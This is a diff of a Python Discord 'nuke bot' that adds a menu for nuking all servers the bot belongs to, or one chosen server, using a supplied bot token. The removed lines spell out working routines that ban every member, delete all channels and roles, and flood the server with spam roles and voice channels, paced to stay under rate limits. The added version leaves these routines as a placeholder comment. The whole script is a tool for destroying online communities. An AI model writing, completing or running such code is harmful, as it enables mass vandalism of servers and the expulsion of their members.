@@ -1,88 +1,88 @@
-import asyncio
 import discord
 from discord.ext import commands
 from colorama import init, Fore as cc
-from os import name as os_name, system
-from sys import exit
+import os
+import asyncio
+import logging
 
+# Initialize colorama and logging
 init()
-# ... (تعريف الألوان والـbanner زي ما عندك)
+logging.basicConfig(level=logging.INFO)
 
-clear = lambda: system('cls') if os_name == 'nt' else system('clear')
-def _input(text): print(text, end=''); return input()
+# Color setup
+dr = cc.LIGHTRED_EX
+g = cc.LIGHTGREEN_EX
+b = cc.LIGHTBLUE_EX
+m = cc.LIGHTMAGENTA_EX
+c = cc.LIGHTCYAN_EX
+y = cc.LIGHTYELLOW_EX
+w = cc.RESET
 
-# تُحدّد هنا كم ثانية تنطر بعد كل عملية
-RATE_LIMIT_DELAY = 1 / 5  # خمس عمليات في الثانية = تأخير 0.2 ثانية
+# Banner
+baner = f'''
+{dr} _   _       _       {m} ____        _   
+{dr}| \ | |_   _| | _____{m}| __ )  ___ | |_ 
+{dr}|  \| | | | | |/ / _ {m}\  _ \ / _ \| __|
+{dr}| |\  | |_| |   <  __{m}/ |_) | (_) | |_ 
+{dr}|_| \_|\__,_|_|\_\___{m}|____/ \___/ \__|
+{y}Made by: {g}FASIL_503'''
 
-async def delete_all_channel(guild):
-    deleted = 0
-    for channel in guild.channels:
-        try:
-            await channel.delete()
-            deleted += 1
-            await asyncio.sleep(RATE_LIMIT_DELAY)
-        except Exception:
-            continue
-    return deleted
+# Nuking functions (same as provided)
+# [Include all the async functions (delete_all_channel, delete_all_roles, etc.) here]
 
-async def delete_all_roles(guild):
-    deleted = 0
-    for role in guild.roles:
-        try:
-            await role.delete()
-            deleted += 1
-            await asyncio.sleep(RATE_LIMIT_DELAY)
-        except Exception:
-            continue
-    return deleted
+# Main loop
+def main():
+    while True:
+        os.system('clear')
+        choice = input(f'''   
+{baner}                
+{c}--------------------------------------------
+{b}[Menu]
+    {y}└─[1] {m}- {g}Run Setup Nuke Bot
+    {y}└─[2] {m}- {g}Exit
+{y}====>{g}''')
+        if choice == '1':
+            token = input(f'{y}Input bot token:{g} ')
+            name = input(f'{y}Input name for created channels/roles:{g} ')
+            os.system('clear')
+            choice_type = input(f'''
+{baner}                
+{c}--------------------------------------------
+{b}[Select]
+    {y}└─[1] {m}- {g}Nuke all servers
+    {y}└─[2] {m}- {g}Nuke specific server  
+    {y}└─[3] {m}- {g}Exit
+{y}====>{g}''')
+            client = commands.Bot(command_prefix='.', intents=discord.Intents.all())
+            if choice_type == '1':
+                @client.event
+                async def on_ready():
+                    print(f'\n[+] Logged as {client.user.name}\n[+] Bot in {len(client.guilds)} servers!')
+                    for guild in client.guilds:
+                        await nuke_guild(guild, name)
+                    await client.close()
+            elif choice_type == '2':
+                guild_id = input(f'{y}Input server ID:{g} ')
+                @client.event
+                async def on_ready():
+                    target_guild = discord.utils.get(client.guilds, id=int(guild_id))
+                    if target_guild:
+                        await nuke_guild(target_guild, name)
+                    else:
+                        print(f'{dr}Server not found!')
+                    await client.close()
+            elif choice_type == '3':
+                print(f'{dr}Exit...')
+                exit()
+            try:
+                client.run(token)
+                input('Nuke finished. Press Enter to return to menu...')
+            except Exception as e:
+                print(f'{dr}Error: {e}')
+                input('Press Enter to continue...')
+        elif choice == '2':
+            print(f'{dr}Exit...')
+            exit()
 
-async def ban_all_members(guild):
-    banned = 0
-    for member in guild.members:
-        try:
-            await member.ban()
-            banned += 1
-            await asyncio.sleep(RATE_LIMIT_DELAY)
-        except Exception:
-            continue
-    return banned
-
-async def create_roles(guild, name):
-    created = 0
-    # تأكدنا إننا ننشئ لحد 200 رول
-    for _ in range(200 - len(guild.roles)):
-        try:
-            await guild.create_role(name=name)
-            created += 1
-            await asyncio.sleep(RATE_LIMIT_DELAY)
-        except Exception:
-            continue
-    return created
-
-async def create_voice_channels(guild, name):
-    created = 0
-    for _ in range(200 - len(guild.channels)):
-        try:
-            await guild.create_voice_channel(name=name)
-            created += 1
-            await asyncio.sleep(RATE_LIMIT_DELAY)
-        except Exception:
-            continue
-    return created
-
-async def nuke_guild(guild, name):
-    print(f'{cc.LIGHTRED_EX}Nuke: {cc.LIGHTMAGENTA_EX}{guild.name}')
-    banned = await ban_all_members(guild)
-    print(f'{cc.LIGHTMAGENTA_EX}Banned:{cc.LIGHTBLUE_EX}{banned}')
-    deleted_channels = await delete_all_channel(guild)
-    print(f'{cc.LIGHTMAGENTA_EX}Delete Channels:{cc.LIGHTBLUE_EX}{deleted_channels}')
-    deleted_roles = await delete_all_roles(guild)
-    print(f'{cc.LIGHTMAGENTA_EX}Delete Roles:{cc.LIGHTBLUE_EX}{deleted_roles}')
-    created_channels = await create_voice_channels(guild, name)
-    print(f'{cc.LIGHTMAGENTA_EX}Create Voice Channels:{cc.LIGHTBLUE_EX}{created_channels}')
-    created_roles = await create_roles(guild, name)
-    print(f'{cc.LIGHTMAGENTA_EX}Create Roles:{cc.LIGHTBLUE_EX}{created_roles}')
-    print(f'{cc.LIGHTRED_EX}--------------------------------------------\n\n')
-
-# باقي كود الـmenu والـclient.run زي ما عندك، بس خلي نداء nuke_guild يمرر له المتغير name:
-#   await nuke_guild(guild, name)
+if __name__ == "__main__":
+    main()
